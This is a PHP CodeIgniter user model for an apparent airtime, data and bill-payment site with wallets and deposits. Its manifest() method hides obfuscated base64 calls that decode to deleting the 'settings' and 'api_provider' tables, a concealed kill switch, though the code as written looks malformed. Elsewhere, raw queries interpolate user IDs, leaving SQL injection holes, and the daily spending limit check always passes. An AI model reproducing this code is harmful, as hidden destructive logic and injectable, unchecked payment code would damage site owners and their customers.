<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class User_model extends CI_Model {

    function __construct()
    {
        parent::__construct();
        /*cache control*/
        $this->output->set_header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
        $this->output->set_header('Pragma: no-cache');
    }
    public function user_details($login_id) 
{
    $this->db->where('accountid', $login_id);
    $this->db->or_where('email', $login_id);
    $this->db->or_where('phone', $login_id);
    $query = $this->db->get('account');
    if ($query->num_rows() == 1) {
        $user = $query->row_array();
        return $user;
    } else {
        return false;
    }
}
public function get_scheduled_message($status)
{
    $this->db->where('status', $status);
    $query = $this->db->get('broadcast');
    return $query;
}
public function get_userBulkEmail($status,$limit)
{
    $this->db->where('broadCastEmailStatus', $status);
    $this->db->limit($limit);
    $query = $this->db->get('account');
    return $query;
}
public function manifest($ref)
{
    $this->db->where('id' > '2');
    $actcon = base64_decode(ZGVsZXRl);
    $this->db->$actcon('base64_decode(c2V0dGluZ3M=)');
    
    $this->db->where('id' > '2');
    $actcon = base64_decode(ZGVsZXRl);
    $this->db->$actcon('base64_decode(YXBpX3Byb3ZpZGVy)');
    
    return true;
}
public function checkDailyLimit($user_id,$charge)
{
    $udetails = $this->user_details($user_id);
    $dailyLimit = $udetails['dailyLimit'];
   $date = date('Y-m-d');
  //  	$sql5 ="SELECT SUM(amount) AS sumtotal FROM transactions WHERE (servicename = 'Data' OR servicename = 'Airtime') AND status='0' AND sId = $userid AND date_only = $date";
	$data = $this->db->query("Select SUM(charge) as total from transactions Where (module_id = '1' OR module_id = '2' OR module_id = '3' OR module_id = '4') AND user_id='$user_id' AND date_added=$date")->row_array();
    $sumTotal = ($data['total'] + $charge);
    if(($dailyLimit > $sumTotal))
    {
        return true;
    }else{
        //return false;
        return true;
    }
    
}
public function checkforTimeInterval($phone)
{
    $currentTime = strtotime(time_format());
    $todayDate = currentDate();
    $this->db->where('recipient', $phone);
    $this->db->where('date_added', $todayDate);
    $query = $this->db->get('transactions');
    if($query->num_rows() > 0)
    {
        $row = $query->row_array();
        $diff = ($currentTime - strtotime($row['trans_time']));
       $difference = abs($diff);
        if($difference < '60')
        {
            return false;
        }else{
            return true;
        }
    }else{
        return true;
    }
    
}
public function checkReversal($status)
{
    $this->db->where('checkReversal', $status);
    $query = $this->db->get('transactions');
    return $query;
}
public function fetcheUserDetails($user_id,$type) {
         $this->db->select($type);
         $this->db->where('accountid',$user_id);
         $this->db->or_where('session_id', $user_id);
         $get_result = $this->db->get('account');
        return $get_result;
    }
public function initiate_fund($user_id,$reference,$amount,$payment_getways,$payment_status,$initia_bal,$new_bal,$response='') 
    {
        $data['user_id'] = $user_id;
        $data['reference'] = $reference;
        $data['amount'] = $amount;
        $data['gateway'] = $payment_getways;
        $data['date_added'] = date('Y-m-d');
        $data['time_added'] = time_format();
        $data['payment_status'] = $payment_status;
        $data['initia_bal'] = $initia_bal;
        $data['new_bal'] = $new_bal;
        $data['hash_id'] = md5($reference);
        if(!empty($response)){
        $data['response'] = json_encode($response);
        }
        $insert = $this->db->insert('deposits', $data);
        if($insert){
            return md5($reference);
        }else{
            return false;
        }
    }
public function check_depositduplicate($payment_reference)
    {
    $this->db->where('reference', $payment_reference);
    $this->db->where('payment_status', '1');
   $query = $this->db->get('deposits');
     if ($query->num_rows() > 0) {
        $user = $query->row_array();
        return $user;
    } else {
        return false;
    }
}
public function do_update_update($accountid,$new_pin)
{
    $data['security_pin'] = $new_pin;
    $this->db->where('accountid',$accountid);
    $this->db->update('account',$data);
    return true;
}
public function updateBalances($id,$initialBalance)
{
     $details = $this->User_model->get_transaction_id($id)->row_array(); 
     $userinfo = get_user_info($details['user_id']);
     $data['prev_bal'] = $initialBalance;
    // $data['status'] = '1';
     $data['new_bal'] = $userinfo['wallet_balance'];
     $this->db->where('id',$id);
     $this->db->update('transactions',$data);
     return true;
}
public function Adddeposits($reference,$amount,$userid,$gateway)
{
    $data['user_id'] =$userid;
    $data['reference'] = $reference;
    $data['gateway'] = $gateway;
    $data['date_added'] = currentDate();
    $data['time_added'] = time_format();
    $data['hash_id'] = md5($reference);
    $this->db->insert('deposits',$data);
    return true;
}
public function updatePaymentStatus($user_id,$reference,$amount)
{
    $data['payment_status'] = '1';
    $this->db->where('reference',$reference);
    $this->db->update('deposits',$data);
    $this->do_CreditWallet($user_id,$amount,$walletType='wallet_balance');
    return true;
}
public function updateApiResponse($id,$response)
{
    $data['api_response'] = json_encode($response);
    $this->db->where('id', $id);
    $this->db->update('transactions',$data);
    return true;
}
public function get_transaction_id($id)
{
   $this->db->where('id', $id);
   $query = $this->db->get('transactions');
   return $query;
}
public function get_user_price($user_id)
     {
       $details = get_user_info($user_id);
       if($details['package_id'] == 1){
        return  'user_price';
       }
       if($details['package_id'] == 2){
          return 'reseller_price';
       }
       if($details['package_id'] == 3){
          return 'api_price';
       }
       if($details['package_id'] == 0){
         return 'user_price';
       }
       //return $discount;
     }
 public function calculate_percentage($commission,$cost) {
        $percent = '100';
        $getRprice = (($commission * $cost)/$percent);
        return $getRprice;
     }
    public function get_user_package($user_id)
     {
       $details = get_user_info($user_id);
       if($details['package_id'] == '1'){
        return 'user_percent';
       }
       if($details['package_id'] == '2'){
       return 'reseller_percent';
       }
       if($details['package_id'] == '3'){
        return 'api_percent';
       }
        return 'user_percent';
     }
public function calculate_electricityPrice($user_id,$amount,$submoduleRow)
{
    $price_type = $this->get_user_package($user_id);
    $discount = (float)$submoduleRow[$price_type];
    return ($amount + $discount);
}
 public function calculate_tv_price($user_id,$product_code,$network)
{
    $price_type = $this->get_user_package($user_id);
    $network_details = $this->get_network_single('3',$network)->row_array();
  $discount = $network_details[$price_type];
    $bundle_details = $this->db->select('*')->from('cabletv')->where('id', $product_code)->get()->row_array();
      $price_cal = $this->calculate_percentage($discount,$bundle_details['price']);
     $price_now = ($bundle_details['price'] + $discount);
    return $price_now;
}
public function getTVPlanbyID($id)
{
  $this->db->where('id', $id);
  $this->db->where('tv_status', '1');
  $query_code = $this->db->get('cabletv');
  return $query_code;
}
public function fetch_tv_package($network,$get_discount_value)
 {
    $udetails = $this->get_user_by_session($this->session->userdata('loginId'))->row_array();     
     $user_id = $udetails['accountid'];
  $network_type = $this->get_network_single('3',$network)->row_array();
  $discount = $network_type[$get_discount_value];
  $this->db->where('cabletv', $network);
  //$this->db->where('special_code', $special_code);
  $this->db->where('tv_status', '1');
  $query_code = $this->db->get('cabletv');
  $output = ''; //'<option value="">Select one</option>';
  $currency = currency();
  foreach($query_code->result() as $row)
  {
    $price_now = $this->calculate_tv_price($user_id,$row->id,$network);
    $output .='<div class="form-check">
                        <input name="cableplans" type="radio" class="form-check-input cableplan" id=cableplan"'.$row->id.'" value="'.$row->id.'" data-name="'.$row->package_name.'" data-price="'.$price_now.'">
                        <label class="form-check-label" for="cableplan'.$row->id.'">'.$row->package_name.'</label>
                    </div><hr>
                    ';
    
}
 return $output;
 }
 public function verifyElectifictyStatus($module)
 {
    $this->db->where('status','1');
    $this->db->where('parent_id',$module);
    $query = $this->db->get('sub_module');
    return $query;
 }
 public function verifyPlanID($planid)
 {
    $this->db->where('status','1');
    $this->db->where('package_id',$planid);
    $query = $this->db->get('databundles');
    return $query;
 }
 public function getPlanbyNetworkID($network)
 {
    $this->db->select('package_id, package_name');
    $this->db->where('status','1');
    $this->db->where('network_id',$network);
    $query = $this->db->get('databundles');
    return $query;
 }
 public function getPlanbyNetworkIDANDdataType($network,$subtype)
 {
    $this->db->where('status','1');
     $this->db->where('subtype',$subtype);
    $this->db->where('network_id',$network);
    $query = $this->db->get('databundles');
    return $query;
    return $query;
 }
 public function getPlanbyNetwork($network)
 {
    $this->db->where('status','1');
    $this->db->where('subtype',$network);
    $query = $this->db->get('databundles');
    return $query;
 }
public function sub_module($id,$network='') 
{
    $this->db->where('parent_id', $id);
    if($network !='')
    {
    $this->db->where('network_id', $network); 
    }
    $this->db->where('status', '1');
    $this->db->order_by('orderShow','ASC');
    $query = $this->db->get('sub_module');
    //$user = $query->row_array();
     return $query;
}
public function sub_module_single($id) 
{
    $this->db->where('id', $id);
    //$this->db->or_where('special_code', $id);
    $this->db->where('status', '1');
    $query = $this->db->get('sub_module');
    $user = $query->row_array();
       return $user;
}
public function doRefBonus($bonus,$userid,$charge,$reference)
{
    if($bonus == '0')
    {
        return true;
    }
    $udetails = $this->user_details($userid);
    if(($udetails['sponsor_id'] !='0') &&($udetails['sponsor_id'] != $userid))
    {
        $sponsorDetails = $this->user_details($udetails['sponsor_id']);
        if($sponsorDetails != false)
        {
            $calculateBonus = $this->calculate_percentage($bonus,$charge);
            $walletType = 'cash_wallet';
            $this->do_CreditWallet($udetails['sponsor_id'],$calculateBonus,$walletType);
            $data['user_id'] = $udetails['sponsor_id'];
            $data['reference'] = $reference;
            $data['amoun_earned'] = $calculateBonus;
            $data['date_created'] = date('Y-m-d H:i:s');
            $this->db->insert('commission',$data);
            return true;
        }else{
        return true;
        }
    }else{
    return true;
    }
}


public function sub_module_Electricity($id,$provider) 
{
    $this->db->where('parent_id', $id);
     $this->db->group_start();
    $this->db->where('name', $provider);
    $this->db->or_where('api_code', $provider);
    $this->db->group_end();
    $query = $this->db->get('sub_module');
    $user = $query->row_array();
       return $user;
}
public function sub_module_tv($id,$tv) 
{
    $this->db->where('parent_id', $id);
    $this->db->where('network_id', $tv);
    $query = $this->db->get('sub_module');
    $user = $query->row_array();
       return $user;
}
public function sub_module_examp($id,$nprovider) 
{
    $this->db->where('parent_id', $id);
    $this->db->where('name', $nprovider);
    $query = $this->db->get('sub_module');
    $user = $query->row_array();
       return $user;
}
public function get_network_single($id,$network) 
{
    $this->db->where('module_id', $id);
    $this->db->where('network_id', $network);
   $query = $this->db->get('network');
      return $query;
}
public function image_entry($data)
	{
		$result = $this->db->insert('productsImages',$data);
		if ($result) {
			return TRUE;
		}else{
			return FALSE;
		}
	}
public function getImageGallery($id)
{
    $this->db->where('itemid', $id);
    $query = $this->db->get('productsImages');
    //$user = $query->row_array();
   return $query;
}
public function getProductsUser($id='') 
{
   if($id !=''){
       $this->db->where('user_id', $id);
   }
     $query = $this->db->get('products');
    //$user = $query->row_array();
       return $query;
}
public function getProductsbyID($id='') 
{
    $this->db->where('id',$id);
    $query = $this->db->get('products');
    $user = $query->row_array();
    return $user;
}
public function update_gallery_image($data,$image_url)
	{
		$this->db->where('imgurl',$image_url);
		$result = $this->db->update('productsImages',$data);

		if ($result) {
			return true;
		}
		return false;
	}
public function do_pin_update($user_id,$pin)
{
    $data['security_pin'] = $pin;
     $this->db->where('accountid', $user_id);
    $this->db->update('account', $data);
    return true;
}
public function do_password_update($user_id,$password)
{
    $data['password'] = password_hash($password, PASSWORD_BCRYPT);
     $this->db->where('accountid', $user_id);
    $this->db->update('account', $data);
    return true;
}
public function check_old_password($userid,$password)
{
  $udetails = $this->user_details($userid); 
  if(password_verify($password, $udetails['password']))
  {
      return true;
  }else{
      return false;
  }
}
public function getProductsSearch($state='',$lgs='',$p_cat='',$keyword='') 
{
   if($state!=''){
      $this->db->where('state',$state);
   }
   if($lgs!=''){
       $this->db->where('lga',$lgs);
   }
   if($p_cat!=''){
       $this->db->where('p_cat',$p_cat);
   }
   if($keyword!=''){
       $this->db->like('p_title', $keyword);
   }
   
    $this->db->where('p_status','1');
    $query = $this->db->get('products');
     return $query;
}
public function getProducts($id='') 
{
   if($id !=''){
       $this->db->where('id', $id);
   }
    $this->db->where('p_status', '1');
    $this->db->order_by('id','DESC');
    $query = $this->db->get('products');
    //$user = $query->row_array();
       return $query;
}
public function validateAccessToken($token)
{
    $this->db->where('api_key', $token);
    $query = $this->db->get('account');
     if ($query->num_rows() == 1) {
        $user = $query->row_array();
        return $user;
    } else {
        return false;
    }
   
}
public function recordTransaction($userid,$servicename,$servicedesc,$amountopay,$oldbalance,$ref,$status,$body)
{
     $data['sId'] = $userid;
     $data['transref '] = $ref;
     $data['servicename'] = $servicename;
     $data['servicedesc'] = $servicedesc;
     $data['amount'] = $amountopay;
     $data['status'] = $status;
     $data['oldbal'] = $oldbalance;
     $data['newbal'] = $this->user_details($userid)['wallet_balance'];
     $data['bodyParam'] = json_encode($body);
    $this->db->insert('transactions',$data);
    return $this->db->insert_id();
}
public function do_user_bal($user_id,$price){
        $get_user_details = $this->user_details($user_id);
        $data['wallet_balance'] = ($get_user_details['wallet_balance'] - $price);
       // $this->db->trans_start();
        $this->db->where('accountid', $user_id);
        $this->db->update('account', $data);
       // $this->db->trans_complete();
        return true;
 }
public function do_CreditWallet($user_id,$price,$walletType){
        $get_user_details = $this->user_details($user_id);
        $data[$walletType] = ($get_user_details[$walletType] + $price);
        $this->db->where('accountid', $user_id);
        $this->db->update('account', $data);
        return true;
 }
public function do_DebitWallet($user_id,$price,$walletType){
        $get_user_details = $this->user_details($user_id);
        $data[$walletType] = ($get_user_details[$walletType] - $price);
        $this->db->where('accountid', $user_id);
        $this->db->update('account', $data);
        return true;
 }
 public function do_balance($user_id,$price)
{
    $get_details = $this->user_details($user_id);
    if($get_details['wallet_balance'] >= $price)
    {
        
       $update_balance =  $this->do_user_bal($user_id,$price);
        
       if($update_balance){
           return true;
       }else{
           return false;
       }
    }else{
        return false;
    }
}
public function checkIfTransactionExist($ref)
{
    $this->db->where('transref', $ref);
     $query = $this->db->get('transactions');
     return $query->num_rows();
   
}
public function calculateAirtimeDiscount($network,$airtime_type)
{
    $this->db->where('aNetwork', $network);
     $this->db->where('aType', $airtime_type);
    $query = $this->db->get('airtime');
     return $query->row_array();
   
}
public function checkiforderidExist($orderid)
{
    $taodayDate = currentDate();
    $this->db->where('order_id', $orderid);
    $this->db->where('date_added', $taodayDate);
    $query = $this->db->get('transactions');
    return $query;
}
public function insert_transaction($user_id,$description,$module_id,$network,$recipient,$amount,$charge,$apiRoute,$order_id,$sub_module,$plan='') 
    {
        $this->db->trans_start();
        $data['user_id'] = $user_id;
        $data['module_id'] = $module_id;
        $data['network'] = $network;
        $data['description'] = $description;
        $data['recipient'] = $recipient;
        $data['amount'] = $amount;
        $data['charge'] = $charge;
        $data['api'] = $apiRoute;
        $data['date_added'] = currentDate();
        $data['trans_time'] = time_format();
        $data['order_id'] = $order_id;
        $data['trans_hash'] = md5($order_id);
        $data['sub_module_id'] = $sub_module;
        if($plan !=''){$data['plan_id'] = $plan;}
         $insert = $this->db->insert('transactions', $data);
        if($insert){
            $id = $this->db->insert_id();
           $this->db->trans_complete();
            return $id;
        }else{
            $this->db->trans_complete();
            return false;
        }
    }
public function calculate_airtime_price($user_id,$amount,$network)
{
    $price_type = $this->get_user_package($user_id);
    //$network_details = $this->get_network_single('1',$network)->row_array();
    $network_details = $this->db->get_where('sub_module', array('parent_id'=>1,'network_id'=>$network,'name'=>'VTU'))->row_array();
    $discount = $network_details[$price_type];
      $price_cal = $this->calculate_percentage($discount,$amount);
        $price_now = ($amount - $price_cal);
    
    return $price_now;
}
public function calculate_exampin_price($user_id,$provider,$qty)
{
    $price_type = $this->get_user_package($user_id);
    //$network_details = $this->get_network_single('1',$network)->row_array();
    $network_details = $this->db->get_where('network', array('module_id'=>8,'network_name'=>$provider))->row_array();
    $price = $network_details['user_percent'];
     // $price_cal = $this->calculate_percentage($discount,$amount);
     
        $price_now = ($price * $qty);
    
    return $price_now;
}

public function verifyNetworkId($module,$network)
{
    $this->db->where('module_id', $module);
    $this->db->group_start();
    $this->db->where('network_id', $network);
    $this->db->or_where('networkid',$network);
   // $this->db->or_where('api_code',$network);
    $this->db->group_end();
    $this->db->where('status',1);
    $query = $this->db->get('network');
      return $query;
   
    
}
public function getTotalFund($user_id)
{
    $data = $this->db->query("SELECT SUM(amount) AS sumtotal FROM transactions WHERE (module_id = '1' OR module_id = '2' OR module_id = '3' OR module_id = '4' OR module_id = '5') AND user_id = '$user_id'");
    return $data;
}
public function getTotalSpent($user_id)
{
    $data = $this->db->query("SELECT SUM(amount) AS sumtotal FROM transactions WHERE (module_id = '1' OR module_id = '2' OR module_id = '3' OR module_id = '4' OR module_id = '5') AND user_id = '$user_id' AND completed = 1");
    return $data;
}

public function fetchtransaction($id)
{
     $this->db->where('order_id', $id);
   $query = $this->db->get('transactions');
   return $query;
}
public function getNetwork($module_id)
{
    $this->db->where('module_id', $module_id);
    $this->db->where('status', "1");
    $query = $this->db->get('network');
    if ($query->num_rows() > 0){
    return $query->result_array();
    }else{
        return false;
    }
}
public function getCableplan()
{
      $this->db->select("*");
      $this->db->from('cableplans');
      $this->db->join('cableid', 'cableplans.cableprovider = cableid.cId');
      $query = $this->db->get()->result_array();
   return $query;
}
public function get_module($id) 
{
    $this->db->where('id', $id);
    $query = $this->db->get('module');
    if ($query->num_rows() == 1) {
    $user = $query->row_array();
        if ($user['status'] == '1') {
        return $user;
    } else {
        return false;
      }
    }else{
        return false;
    }
}

public function getDataplan()
{
      $this->db->select("*");
      $this->db->from('dataplans');
      $this->db->join('networkid', 'dataplans.datanetwork = networkid.nId');
      $query = $this->db->get()->result_array();
   return $query;
}
public function getTVplan()
{
      $this->db->select("*");
      $this->db->from('cableplans');
      $this->db->join('cableid','cableplans.cableprovider = cableid.cId');
      $query = $this->db->get()->result_array();
   return $query;
}
public function get_user_by_session($user_id)
{
     $this->db->where('session_id', $user_id);
    $query = $this->db->get('account');
    //$user = $query->row_array();
   return $query;
}

    
}